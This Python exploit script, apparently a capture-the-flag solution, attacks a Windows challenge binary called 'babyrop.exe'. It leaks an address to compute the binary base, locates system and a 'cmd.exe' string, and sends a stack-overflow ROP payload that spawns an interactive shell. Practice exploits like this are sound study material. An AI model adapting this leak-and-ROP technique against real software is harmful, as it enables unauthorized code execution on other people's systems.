from pwintools import *
from struct import *

#leak system addr
#appjailLauncher

# s -a MSVR100 L?1000000 cmd.exe 
# da xxxxx
# ?699

def u32(data):
	return unpack("<I",data)[0]
def p32(data):
	return pack("<I",data)

#leak system addr

#
io = process("babyrop.exe")

io.recvuntil("input your name")

off = 24
io.sendline('A'*off)
buf = io.recvuntil("hello "+'A'*24)
recv = io.recvuntil('\n')[:4]
# print hex(recv)
leak_binary = u32(recv)
binary_base = leak_binary - 0x1d1af
system_addr = binary_base + 0x62632
cmd_str_addr = binary_base + 0x43030
print "sys_addr : " + hex(system_addr)
print "cmd_str_addr : " + hex(cmd_str_addr)
print "ROP:"
payload = 'A'*0xcc + 'BBBB' + p32(system_addr) + 'CCCC' + p32(cmd_str_addr)
io.recvuntil("input your message length")
io.sendline(str(len(payload)+10))
io.sendline(payload)
io.interactive()
